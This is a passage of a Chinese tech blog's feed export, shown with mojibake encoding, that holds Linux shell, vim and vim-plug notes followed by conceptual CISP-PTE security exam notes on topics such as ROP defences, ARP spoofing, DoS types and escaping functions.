[ -d <span class="string">&quot;<span class="variable">$1</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$1</span> æ˜¯ç›®å½•&quot;</span></span><br><span class="line"><span class="keyword">elif</span> [ -f <span class="string">&quot;<span class="variable">$1</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$1</span> æ˜¯æ™®é€šæ–‡ä»¶&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;æœªçŸ¥æ–‡ä»¶ç±»å‹&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># é€»è¾‘åˆ¤æ–­ï¼ˆ&amp;&amp; || é€»è¾‘è¿ç®—ï¼‰</span></span><br><span class="line">[ -n <span class="string">&quot;<span class="variable">$name</span>&quot;</span> ] &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;ä½ è¾“å…¥äº†åå­—ï¼š<span class="variable">$name</span>&quot;</span> || <span class="built_in">echo</span> <span class="string">&quot;æœªè¾“å…¥åå­—&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¾ªç¯ç¤ºä¾‹</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;1..5&#125;; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;for å¾ªç¯ï¼š<span class="variable">$i</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># while å¾ªç¯</span></span><br><span class="line">count=1</span><br><span class="line"><span class="keyword">while</span> [ <span class="variable">$count</span> -le 3 ]; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;while å¾ªç¯ï¼š<span class="variable">$count</span>&quot;</span></span><br><span class="line">    count=$((count + <span class="number">1</span>))</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¯»å–æ–‡ä»¶ï¼ˆå‡è®¾ input.txt å­˜åœ¨ï¼‰</span></span><br><span class="line"><span class="keyword">if</span> [ -f <span class="string">&quot;input.txt&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">read</span> -r line; <span class="keyword">do</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;å¤„ç†å†…å®¹ï¼š<span class="variable">$line</span>&quot;</span></span><br><span class="line">    <span class="keyword">done</span> &lt; input.txt</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;æ–‡ä»¶ input.txt ä¸å­˜åœ¨ï¼Œè·³è¿‡è¯»å–&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿ç®—è¡¨è¾¾å¼</span></span><br><span class="line"><span class="built_in">sum</span>=$((<span class="number">3</span> + <span class="number">5</span>))            <span class="comment"># æ•´æ•°è¿ç®—</span></span><br><span class="line">mul=$(<span class="built_in">expr</span> 3 \* 5)        <span class="comment"># expr è®¡ç®—</span></span><br><span class="line">mod=$(<span class="built_in">expr</span> 10 % 3)        <span class="comment"># å–æ¨¡è¿ç®—</span></span><br><span class="line">div=$(<span class="built_in">echo</span> <span class="string">&quot;scale=2; 3/7&quot;</span> | bc)  <span class="comment"># æµ®ç‚¹è¿ç®—</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç»“æœè¾“å‡º</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;æ•´æ•°æ±‚å’Œï¼š<span class="variable">$sum</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ä¹˜æ³•ç»“æœï¼š<span class="variable">$mul</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;å–æ¨¡ç»“æœï¼š<span class="variable">$mod</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;æµ®ç‚¹é™¤æ³•ç»“æœï¼š<span class="variable">$div</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ¯”è¾ƒç¬¦</span></span><br><span class="line">1. å­—ç¬¦æ¯”è¾ƒ</span><br><span class="line">- ç›¸ç­‰ï¼š[ <span class="string">&quot;<span class="variable">$str1</span>&quot;</span> = <span class="string">&quot;<span class="variable">$str2</span>&quot;</span> ]</span><br><span class="line">- ä¸ç­‰ï¼š[ <span class="string">&quot;<span class="variable">$str1</span>&quot;</span> != <span class="string">&quot;<span class="variable">$str2</span>&quot;</span> ]</span><br><span class="line">- ç©ºå­—ç¬¦ä¸²ï¼š[ -z <span class="string">&quot;<span class="variable">$str</span>&quot;</span> ]</span><br><span class="line">- éç©ºå­—ç¬¦ä¸²ï¼š[ -n <span class="string">&quot;<span class="variable">$str</span>&quot;</span> ]</span><br><span class="line">- å­—å…¸é¡ºåºæ¯”è¾ƒï¼š[ <span class="string">&quot;<span class="variable">$str1</span>&quot;</span> \&gt; <span class="string">&quot;<span class="variable">$str2</span>&quot;</span> ] æˆ– [[ <span class="string">&quot;<span class="variable">$str1</span>&quot;</span> &gt; <span class="string">&quot;<span class="variable">$str2</span>&quot;</span> ]]</span><br><span class="line"></span><br><span class="line">2. æ•°å­—æ¯”è¾ƒ</span><br><span class="line">- ç›¸ç­‰ï¼š[ <span class="string">&quot;<span class="variable">$num1</span>&quot;</span> -eq <span class="string">&quot;<span class="variable">$num2</span>&quot;</span> ]</span><br><span class="line">- ä¸ç­‰ï¼š[ <span class="string">&quot;<span class="variable">$num1</span>&quot;</span> -ne <span class="string">&quot;<span class="variable">$num2</span>&quot;</span> ]</span><br><span class="line">- å¤§äºï¼š[ <span class="string">&quot;<span class="variable">$num1</span>&quot;</span> -gt <span class="string">&quot;<span class="variable">$num2</span>&quot;</span> ]</span><br><span class="line">- å°äºï¼š[ <span class="string">&quot;<span class="variable">$num1</span>&quot;</span> -lt <span class="string">&quot;<span class="variable">$num2</span>&quot;</span> ]</span><br><span class="line">- å¤§äºæˆ–ç­‰äºï¼š[ <span class="string">&quot;<span class="variable">$num1</span>&quot;</span> -ge <span class="string">&quot;<span class="variable">$num2</span>&quot;</span> ]</span><br><span class="line">- å°äºæˆ–ç­‰äºï¼š[ <span class="string">&quot;<span class="variable">$num1</span>&quot;</span> -le <span class="string">&quot;<span class="variable">$num2</span>&quot;</span> ]</span><br><span class="line"></span><br><span class="line">3. ç®€åŒ–æ•°å­—æ¯”è¾ƒ</span><br><span class="line">ä½¿ç”¨ (( )) æ¯”è¾ƒæ•°å­—ï¼š</span><br><span class="line">- ç›¸ç­‰ï¼š(( num1 == num2 ))</span><br><span class="line">- å¤§äºï¼š(( num1 &gt; num2 ))</span><br><span class="line">- å°äºï¼š(( num1 &lt; num2 ))</span><br><span class="line"></span><br><span class="line"><span class="comment"># å‡½æ•°ç¤ºä¾‹</span></span><br><span class="line"><span class="function"><span class="title">greet</span></span>() &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;æ¬¢è¿ï¼Œ<span class="variable">$1</span>ï¼&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">greet <span class="string">&quot;Shell å­¦ä¹ è€…&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–å½“å‰æ—¥æœŸ</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;å½“å‰æ—¶é—´ï¼š<span class="subst">$(date <span class="string">&quot;+%Y-%m-%d %H:%M:%S&quot;</span>)</span>&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<h3 id="vim-åŸºç¡€"><a href="#vim-åŸºç¡€" class="headerlink" title="vim åŸºç¡€"></a>vim åŸºç¡€</h3><h4 id="è¿›å…¥-é€€å‡ºç¼–è¾‘æ¨¡å¼"><a href="#è¿›å…¥-é€€å‡ºç¼–è¾‘æ¨¡å¼" class="headerlink" title="è¿›å…¥&#x2F;é€€å‡ºç¼–è¾‘æ¨¡å¼"></a>è¿›å…¥&#x2F;é€€å‡ºç¼–è¾‘æ¨¡å¼</h4><ul>
<li>æŒ‰ <code>i</code> è¿›å…¥ç¼–è¾‘æ¨¡å¼ï¼Œ<code>ESC</code> é€€å‡ºç¼–è¾‘æ¨¡å¼ï¼Œè¿”å›å‘½ä»¤æ¨¡å¼ã€‚  </li>
<li>åœ¨å‘½ä»¤æ¨¡å¼ä¸‹ï¼š<ul>
<li><code>:wq</code> <strong>ä¿å­˜å¹¶é€€å‡º</strong>  </li>
<li><code>:q!</code> <strong>ä¸ä¿å­˜é€€å‡º</strong></li>
</ul>
</li>
</ul>
<h4 id="ç§»åŠ¨å…‰æ ‡"><a href="#ç§»åŠ¨å…‰æ ‡" class="headerlink" title="ç§»åŠ¨å…‰æ ‡"></a>ç§»åŠ¨å…‰æ ‡</h4><ul>
<li><code>HJKL</code> åœ¨å‘½ä»¤æ¨¡å¼ä¸‹åˆ†åˆ«è¡¨ç¤ºï¼š<ul>
<li><code>H</code> å·¦</li>
<li><code>J</code> ä¸‹</li>
<li><code>K</code> ä¸Š</li>
<li><code>L</code> å³</li>
</ul>
</li>
<li><code>w</code> æŒ‰å•è¯å‘å‰ç§»åŠ¨å…‰æ ‡ï¼Œ<code>b</code> åå‘ç§»åŠ¨  </li>
<li><mark>Ctrl + F</mark> (<strong>Foreword</strong>) <strong>å‘ä¸‹ç¿»é¡µ</strong> (<code>PageDown</code>)  </li>
<li><mark>Ctrl + B</mark> (<strong>Backwards</strong>) <strong>å‘ä¸Šç¿»é¡µ</strong> (<code>PageUp</code>)  </li>
<li><code>æ•°å­— + gg</code> è·³è½¬åˆ°æŒ‡å®šè¡Œ  </li>
<li><code>æ•°å­— + j/k</code> è·³è½¬å¤šè¡Œ  </li>
<li><code>/å…³é”®è¯</code> æœç´¢å…³é”®å­—ï¼Œ<code>n</code> ä¸‹ä¸€ä¸ªï¼Œ<code>Shift + N</code> ä¸Šä¸€ä¸ª</li>
</ul>
<h4 id="å¤åˆ¶ã€å‰ªåˆ‡ã€ç²˜è´´"><a href="#å¤åˆ¶ã€å‰ªåˆ‡ã€ç²˜è´´" class="headerlink" title="å¤åˆ¶ã€å‰ªåˆ‡ã€ç²˜è´´"></a>å¤åˆ¶ã€å‰ªåˆ‡ã€ç²˜è´´</h4><ul>
<li><code>cc</code> <strong>å‰ªåˆ‡ä¸€è¡Œ</strong>ï¼ˆå¯åŠ æ•°å­—ï¼Œå¦‚ <code>c2c</code> å‰ªåˆ‡ä¸¤è¡Œï¼‰  </li>
<li><code>yy</code> <strong>å¤åˆ¶å½“å‰è¡Œ</strong>  </li>
<li><code>p</code> <strong>ç²˜è´´</strong>  </li>
<li>åœ¨å‘½ä»¤æ¨¡å¼ä¸‹ï¼š<ul>
<li><code>:%y</code> <strong>å¤åˆ¶æ•´ä¸ªæ–‡ä»¶</strong>  </li>
<li><code>ggVG</code> <strong>é€‰ä¸­å…¨éƒ¨æ–‡æœ¬</strong></li>
</ul>
</li>
</ul>
<h4 id="æ’¤é”€-æ¢å¤"><a href="#æ’¤é”€-æ¢å¤" class="headerlink" title="æ’¤é”€ &amp; æ¢å¤"></a>æ’¤é”€ &amp; æ¢å¤</h4><ul>
<li><code>u</code> <strong>æ’¤é”€</strong>ï¼ˆUndoï¼‰  </li>
<li><code>Ctrl + R</code> <strong>æ¢å¤æ’¤é”€çš„æ“ä½œ</strong>ï¼ˆRedoï¼‰</li>
</ul>
<h4 id="ä»£ç ç¼©è¿›"><a href="#ä»£ç ç¼©è¿›" class="headerlink" title="ä»£ç ç¼©è¿›"></a>ä»£ç ç¼©è¿›</h4><ul>
<li><code>v</code> è¿›å…¥ <strong>å¯è§†æ¨¡å¼</strong>ï¼Œé€‰ä¸­æ–‡æœ¬åï¼š<ul>
<li><code>&lt;</code> <strong>å‡å°‘ç¼©è¿›</strong>  </li>
<li><code>&gt;</code> <strong>å¢åŠ ç¼©è¿›</strong>  </li>
<li><code>+y</code> <strong>å¤åˆ¶é€‰ä¸­å†…å®¹</strong></li>
</ul>
</li>
</ul>
<h4 id="çª—å£-æ ‡ç­¾ç®¡ç†"><a href="#çª—å£-æ ‡ç­¾ç®¡ç†" class="headerlink" title="çª—å£ &amp; æ ‡ç­¾ç®¡ç†"></a>çª—å£ &amp; æ ‡ç­¾ç®¡ç†</h4><ul>
<li><code>:tabnew [æ–‡ä»¶]</code> <strong>æ–°å»ºæ ‡ç­¾é¡µ</strong>  </li>
<li><code>:tabc</code> <strong>å…³é—­å½“å‰æ ‡ç­¾</strong>  </li>
<li><code>:tabo</code> <strong>å…³é—­å…¶ä»–æ‰€æœ‰æ ‡ç­¾</strong>  </li>
<li><code>:tabs</code> <strong>æŸ¥çœ‹æ‰€æœ‰æ‰“å¼€çš„æ ‡ç­¾</strong>  </li>
<li><code>:tabp / :tabn</code> <strong>åˆ‡æ¢å‰&#x2F;åä¸€ä¸ªæ ‡ç­¾</strong>  </li>
<li>æ ‡å‡†æ¨¡å¼ä¸‹ï¼š<ul>
<li><code>gt</code> <strong>ä¸‹ä¸€ä¸ª tab</strong>  </li>
<li><code>gT</code> <strong>ä¸Šä¸€ä¸ª tab</strong></li>
</ul>
</li>
<li><code>R</code> <strong>åˆ·æ–° NerdTree</strong></li>
</ul>
<h4 id="çª—å£å¯¹é½"><a href="#çª—å£å¯¹é½" class="headerlink" title="çª—å£å¯¹é½"></a>çª—å£å¯¹é½</h4><ul>
<li><code>zz</code> <strong>è®©å…‰æ ‡æ‰€åœ¨è¡Œä½äºå±å¹•ä¸­é—´</strong>  </li>
<li><code>zt</code> <strong>è®©å…‰æ ‡æ‰€åœ¨è¡Œç½®é¡¶</strong>  </li>
<li><code>zb</code> <strong>è®©å…‰æ ‡æ‰€åœ¨è¡Œç½®åº•</strong>  </li>
<li><code>Ctrl + E</code> <strong>å‘ä¸‹æ»šåŠ¨ä¸€è¡Œ</strong>  </li>
<li><code>Ctrl + Y</code> <strong>å‘ä¸Šæ»šåŠ¨ä¸€è¡Œ</strong></li>
</ul>
<h4 id="Vim-é…ç½®"><a href="#Vim-é…ç½®" class="headerlink" title="Vim é…ç½®"></a>Vim é…ç½®</h4><ul>
<li>åœ¨å‘½ä»¤æ¨¡å¼ä¸‹è¾“å…¥ï¼š<ul>
<li><code>:syntax on</code> <strong>å¼€å¯ä»£ç é«˜äº®</strong>  </li>
<li><code>:set number</code> <strong>æ˜¾ç¤ºè¡Œå·</strong></li>
</ul>
</li>
<li><strong>å…¨å±€ç”Ÿæ•ˆ</strong>ï¼šç¼–è¾‘ <code>~/.vimrc</code> æ–‡ä»¶ï¼Œæ·»åŠ ï¼š<br>syntax on<br>set number</li>
</ul>
<h4 id="g-ç¼–è¯‘"><a href="#g-ç¼–è¯‘" class="headerlink" title="g++ç¼–è¯‘"></a>g++ç¼–è¯‘</h4><p>é»˜è®¤ç¼–è¯‘ï¼š <code>g++ [é€‰é¡¹] -o ç”Ÿæˆæ–‡ä»¶å æºæ–‡ä»¶.cpp</code>  å¦‚æœä¸åŠ  -o é€‰é¡¹ï¼Œé»˜è®¤ä¼šç”Ÿæˆ a.out<br>ä½¿ç”¨c++11æ ‡å‡†ï¼š <code>g++ -std=c++11 file.cpp</code></p>
<h3 id="æ’ä»¶ç®¡ç†"><a href="#æ’ä»¶ç®¡ç†" class="headerlink" title="æ’ä»¶ç®¡ç†"></a>æ’ä»¶ç®¡ç†</h3><p>å®‰è£…Vim-Plugï¼ˆæ’ä»¶ç®¡ç†å™¨ï¼‰ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">curl -fLo ~/.<span class="keyword">vim</span>/autoload/plug.<span class="keyword">vim</span> --create-dirs \</span><br><span class="line">     https://raw.githubusercontent.<span class="keyword">com</span>/junegunn/<span class="keyword">vim</span>-plug/master/plug.<span class="keyword">vim</span></span><br></pre></td></tr></table></figure></div>

<p>å®‰è£…æ’ä»¶ï¼š åœ¨ ~&#x2F;.vimrc æ·»åŠ </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LEAF"><figure class="iseeu highlight /leaf"><table><tr><td class="code"><pre><span class="line">call plug<span class="punctuation">#</span><span class="keyword">begin</span><span class="params">(&#x27;~<span class="operator">/</span>.<span class="variable">vim</span><span class="operator">/</span><span class="variable">plugged</span>&#x27;)</span></span><br><span class="line">Plug &#x27;preservim/nerdtree&#x27;</span><br><span class="line">Plug &#x27;junegunn/fzf&#x27;</span><br><span class="line">call plug<span class="punctuation">#</span><span class="keyword">end</span><span class="params">()</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>æ’ä»¶æŒ‡ä»¤ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line"><span class="symbol">:PlugInstall</span>        <span class="comment"># å®‰è£…æ’ä»¶ï¼ˆä» ~/.vimrc é…ç½®çš„æºä¸‹è½½å¹¶å®‰è£…æ’ä»¶ï¼‰</span></span><br><span class="line"><span class="symbol">:PlugUpdate</span>         <span class="comment"># æ›´æ–°å·²å®‰è£…çš„æ’ä»¶</span></span><br><span class="line"><span class="symbol">:PlugUpgrade</span>        <span class="comment"># æ›´æ–° Vim-Plug æœ¬èº«</span></span><br><span class="line"><span class="symbol">:PlugClean</span>          <span class="comment"># æ¸…ç†æ— ç”¨çš„æ’ä»¶ï¼ˆåˆ é™¤æœªåœ¨ ~/.vimrc é…ç½®ä¸­çš„æ’ä»¶ï¼‰</span></span><br><span class="line"><span class="symbol">:PlugStatus</span>         <span class="comment"># æ˜¾ç¤ºå·²å®‰è£…æ’ä»¶çš„çŠ¶æ€</span></span><br><span class="line"><span class="symbol">:PlugDiff</span>           <span class="comment"># æ˜¾ç¤ºæœ¬åœ°æ’ä»¶ä¸è¿œç¨‹ä»“åº“çš„å·®å¼‚</span></span><br></pre></td></tr></table></figure></div>]]></content>
      <categories>
        <category>linux</category>
        <category>ç¬”è®°</category>
      </categories>
      <tags>
        <tag>ç¬”è®°</tag>
        <tag>linux</tag>
        <tag>æ“ä½œç³»ç»Ÿ</tag>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title>cisp-pteå®¢è§‚é¢˜ç¬”è®°</title>
    <url>/posts/13378.html</url>
    <content><![CDATA[<p>cisp-pteå®¢è§‚é¢˜åˆ·é¢˜ï¼Œè®°å½•çš„éƒ½æ˜¯æˆ‘ä¸ç†Ÿæ‚‰çš„å†…å®¹ï¼Œåºå·ä¸‹é¢çš„æ— åºåºå·æ˜¯æ‰©å±•çš„çŸ¥è¯†</p>
<span id="more"></span>
<h2 id="ç¬¬ä¸€ä»½"><a href="#ç¬¬ä¸€ä»½" class="headerlink" title="ç¬¬ä¸€ä»½"></a>ç¬¬ä¸€ä»½</h2><ol>
<li>ROPæ˜¯ä¸€ç§æ”»å‡»æŠ€æœ¯<ul>
<li><strong>PIE, StackCanary, NX&#x2F;DEP</strong>Â éƒ½æ˜¯ç°ä»£æ“ä½œç³»ç»Ÿå’Œç¼–è¯‘å™¨ä¸ºäº†å¢åŠ äºŒè¿›åˆ¶ç¨‹åºå®‰å…¨æ€§ã€ä½¿æ¼æ´åˆ©ç”¨æ›´åŠ å›°éš¾è€Œå¼•å…¥çš„<strong>é˜²å¾¡æœºåˆ¶</strong>ã€‚<br><img src="https://pic1.imgdb.cn/item/68a6d50a58cb8da5c840d1a9.png"></li>
</ul>
</li>
<li>Apacheå•ä¸ªè¿›ç¨‹ä¸­phpåŒ¿åå‡½æ•°çš„åå­—ä¸º  \x00lambda_%d<ul>
<li>å…¶ä¸­Â <code>\x00</code>ï¼ˆ<strong>NULL å­—ç¬¦</strong>ï¼‰æ˜¯Â <strong>PHP å†…éƒ¨çš„ä½œç”¨åŸŸåˆ†éš”ç¬¦</strong></li>
<li><code>%d</code>Â æ˜¯ä¸€ä¸ªé€’å¢çš„ç¼–å·ï¼ˆæ¯ä¸ªåŒ¿åå‡½æ•°éƒ½æœ‰å”¯ä¸€çš„ IDï¼‰</li>
</ul>
</li>
<li>SHAåŠ å¯†æ³•çš„å­—å…ƒèŒƒå›´ä¸º<code> [a-f0-9]</code> <ul>
<li>SHAæ˜¯ä¸€ç§å“ˆå¸Œç®—æ³•ï¼Œå“ˆå¸Œä¸å¯é€†</li>
<li>ç¼–ç ç”¨çš„æ˜¯åå…­è¿›åˆ¶ï¼Œè¾“å‡ºçš„åå…­è¿›åˆ¶é€šå¸¸æ˜¯å°å†™</li>
</ul>
</li>
<li>åœ¨ç›¸åŒçš„å®‰å…¨å¼ºåº¦ä¸‹ï¼ŒECCç®—æ³•çš„å¯†é’¥é•¿åº¦æ¯”RSAçŸ­<ul>
<li>å¯¹äºæ‰€æœ‰éå¯¹ç§°åŠ å¯†ç®—æ³•ï¼Œå¯†é’¥é•¿åº¦éƒ½æ˜¯å®‰å…¨æ€§çš„å…³é”®ã€‚å¯†é’¥è¶ŠçŸ­ï¼Œè¶Šå®¹æ˜“è¢«æš´åŠ›ç ´è§£ã€‚</li>
</ul>
</li>
<li>URLè®¿é—®æ§åˆ¶ä¸å½“ä¸åŒ…æ‹¬ä½¿ç”¨åˆ†æ•£ç™»å½•è®¤è¯<ul>
<li>åˆ†æ•£ç™»å½•è®¤è¯æ˜¯ä¸€ç§ç³»ç»Ÿæ¡†æ¶é€‰æ‹© ä¸€ä¸ªç³»ç»Ÿå¯èƒ½æœ‰å¤šç§ç‹¬ç«‹ç™»å½•çš„å…¥å£ï¼Œéƒ½å¯ä»¥å®‰å…¨</li>
</ul>
</li>
<li>æ–‡ä»¶ä¸Šä¼ å¸¸è§çš„é˜²å¾¡ï¼š<ul>
<li>æœåŠ¡ç«¯æ–‡ä»¶æ‰©å±•åæ£€æµ‹</li>
<li>å®¢æˆ·ç«¯æ£€æŸ¥æœºåˆ¶JavaScriptéªŒè¯</li>
<li>æœåŠ¡çš„MIMEæ£€æµ‹</li>
</ul>
</li>
<li>é˜²ç«å¢™ä¸»è¦éƒ¨ç½²åœ¨ç½‘ç»œè¾¹ç•Œ</li>
<li>å®‰å…¨é¢†åŸŸçš„AAAæ¨¡å‹ï¼š<ul>
<li><strong>æ ‡è¯† (Identification):</strong>Â ä½ å£°ç§°ä½ æ˜¯è°ï¼ˆä¾‹å¦‚ï¼Œè¾“å…¥ç”¨æˆ·åï¼‰ã€‚</li>
<li><strong>è®¤è¯ (Authentication):</strong>Â ä½ è¯æ˜ä½ æ˜¯ä½ æ‰€å£°ç§°çš„äººã€‚å£ä»¤ï¼ˆå¯†ç ï¼‰å°±æ˜¯æœ€å¸¸è§çš„è®¤è¯å› ç´ ï¼ˆâ€œä½ çŸ¥é“çš„ä¸œè¥¿â€ï¼‰ã€‚</li>
<li><strong>æˆæƒ (Authorization):</strong>Â åœ¨ä½ è¢«æˆåŠŸè®¤è¯åï¼Œç³»ç»Ÿå†³å®šä½ è¢«å…è®¸åšä»€ä¹ˆï¼ˆä¾‹å¦‚ï¼Œæ™®é€šç”¨æˆ·åªèƒ½è¯»ï¼Œç®¡ç†å‘˜å¯ä»¥è¯»å’Œå†™ï¼‰ã€‚</li>
<li><strong>å®¡è®¡ (Auditing):</strong>Â è®°å½•ä½ åšäº†ä»€ä¹ˆã€‚</li>
</ul>
</li>
<li>ARPæ”»å‡»ä¸æ˜¯æœåŠ¡æ‹’ç»æ”»å‡»ã€‚<ul>
<li><strong>ARP æ”»å‡»ï¼ˆARP Spoofing &#x2F; ARP Poisoningï¼‰</strong> æ˜¯ä¸€ç§å±€åŸŸç½‘ï¼ˆLANï¼‰å†…çš„æ”»å‡»æ–¹å¼ï¼Œåˆ©ç”¨äº† <strong>ARP åè®®æ²¡æœ‰è®¤è¯æœºåˆ¶</strong> çš„æ¼æ´ã€‚</li>
<li>å±€åŸŸç½‘é€šä¿¡ç”¨åˆ°çš„æ˜¯ARPç¼“å­˜çŸ¥é“ç›®æ ‡IPå¯¹åº”çš„MACåœ°å€ã€‚æ”»å‡»è€…å¯ä»¥ä¼ªé€  ARP åŒ…ï¼Œæ¬ºéª—å±€åŸŸç½‘ä¸­çš„ä¸»æœºæˆ–ç½‘å…³ï¼Œè®©å®ƒä»¬çš„ ARP è¡¨å‡ºç°é”™è¯¯æ˜ å°„ã€‚<br>æ”»å‡»è€…å¯ä»¥åšåˆ°ï¼š<ul>
<li><strong>çªƒå¬æµé‡</strong>ï¼ˆå—…æ¢ç”¨æˆ·åå¯†ç ã€ä¼šè¯Cookieç­‰ï¼‰  </li>
<li><strong>ä¸­é—´äººæ”»å‡»ï¼ˆMITMï¼‰</strong>ï¼ˆç¯¡æ”¹æ•°æ®ã€æ³¨å…¥æ¶æ„ä»£ç ï¼‰</li>
<li><strong>æ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆDoSï¼‰</strong>ï¼ˆç›´æ¥è®©æ•°æ®æµæ— æ³•åˆ°è¾¾æ­£ç¡®çš„ç›®æ ‡ï¼‰</li>
</ul>
</li>
</ul>
</li>
<li>æ‹’ç»æœåŠ¡æ”»å‡»åŒ…æ‹¬ä¸€ä¸‹å‡ ä¸ª<ul>
<li><strong>Land æ”»å‡»ï¼š</strong>Â ä¸€ç§å¤è€çš„ DoS æ”»å‡»ï¼Œå‘é€æºIPå’Œç›®æ ‡IPç›¸åŒçš„TCP SYNåŒ…ï¼Œä½¿ä¸€äº›ç³»ç»Ÿå´©æºƒã€‚</li>
<li><strong>ç•¸å½¢æŠ¥æ–‡æ”»å‡»ï¼š</strong>Â å‘é€ä¸ç¬¦åˆåè®®è§„èŒƒçš„æ•°æ®åŒ…ï¼Œå¯èƒ½å¯¼è‡´ç›®æ ‡ç³»ç»Ÿåè®®æ ˆå´©æºƒæˆ–èµ„æºè€—å°½ï¼ˆå¦‚ Ping of Deathï¼‰ã€‚</li>
<li><strong>DDoS (åˆ†å¸ƒå¼æ‹’ç»æœåŠ¡):</strong>Â åˆ©ç”¨å¤§é‡ä¸»æœºåŒæ—¶å‘èµ·æ”»å‡»ï¼Œæ˜¯ DoS çš„ä¸€ç§å¤§è§„æ¨¡å½¢å¼ã€‚</li>
</ul>
</li>
<li><strong>SSLã€S-HTTP</strong>å±äºWebä¸­ä½¿ç”¨çš„å®‰å…¨åè®®<br>ç›¸å…³çš„å‡ ç§åè®®<ul>
<li><strong>SSL (Secure Sockets Layer)</strong>Â ä»¥åŠå…¶åç»­ç‰ˆæœ¬Â <strong>TLS (Transport Layer Security)</strong>Â æ˜¯ä¸º HTTP æä¾›åŠ å¯†ï¼ˆå³ HTTPSï¼‰çš„åŸºç¡€åè®®ï¼Œæ˜¯ Web å®‰å…¨çš„æ ¸å¿ƒã€‚</li>
<li><strong>S-HTTP (Secure HTTP)</strong>Â æ˜¯æ—©æœŸä¸ HTTPS ç«äº‰çš„å¦ä¸€ä¸ª Web å®‰å…¨åè®®ï¼Œä½†æœ€ç»ˆæ²¡æœ‰æµè¡Œèµ·æ¥ã€‚å°½ç®¡å¦‚æ­¤ï¼Œå®ƒåœ¨å®šä¹‰ä¸Šä»ç„¶æ˜¯â€œWebä¸­ä½¿ç”¨çš„å®‰å…¨åè®®â€ã€‚</li>
<li><strong>S&#x2F;MIME</strong>Â å’ŒÂ <strong>PEM</strong>Â ä¸»è¦ç”¨äºç”µå­é‚®ä»¶çš„å®‰å…¨ï¼ˆåŠ å¯†å’Œç­¾åï¼‰ã€‚</li>
</ul>
</li>
<li>å‡ ç§é˜²æ­¢æ³¨å…¥æ”»å‡»å‡½æ•°ï¼š<ul>
<li><strong>mysql_real_escape_string</strong>Â æ˜¯ PHP æ—§çš„Â mysqlÂ æ‰©å±•ä¸­ä¸“é—¨ç”¨æ¥å¯¹ SQL æŸ¥è¯¢ä¸­çš„å­—ç¬¦ä¸²è¿›è¡Œè½¬ä¹‰çš„å‡½æ•°ï¼Œä»¥é˜²æ­¢SQLæ³¨å…¥ã€‚åœ¨PHP7.0ä¸­å·²è¢«ç§»é™¤ ç°ä»£ä»£ç ä½¿ç”¨PDOå’Œé¢„å¤„ç†è¯­å¥æ¥é˜²å¾¡</li>
<li><strong>htmlentities</strong>Â å’ŒÂ <strong>htmlspecialchars</strong>Â ç”¨äºå°†ç‰¹æ®Šå­—ç¬¦è½¬æ¢ä¸º HTML å®ä½“ï¼Œç›®çš„æ˜¯<strong>é˜²æ­¢ XSS æ”»å‡»</strong></li>
<li><strong>escapeshellarg</strong>Â ç”¨äºè½¬ä¹‰ä¼ é€’ç»™æ“ä½œç³»ç»Ÿå‘½ä»¤çš„å‚æ•°ï¼Œç›®çš„æ˜¯<strong>é˜²æ­¢å‘½ä»¤æ³¨å…¥</strong></li>
</ul>
</li>
<li>åŒå¼•å·æ˜¯æ„é€ ä¸€ä¸ªåˆæ³•è¯­æ³•çš„<strong>å¿…è¦æ­¥éª¤</strong>ï¼Œè€Œä¸æ˜¯ä¸ºäº†â€œç»•è¿‡â€æˆ–â€œæ¬ºéª—â€æŸä¸ªç‰¹å®šçš„è¿‡æ»¤è§„åˆ™ã€‚å®ƒæœ¬èº«æ˜¯æ³¨å…¥è¡Œä¸ºçš„åŸºç¡€ï¼Œè€Œä¸æ˜¯ç»•è¿‡æŠ€æœ¯ã€‚<ul>
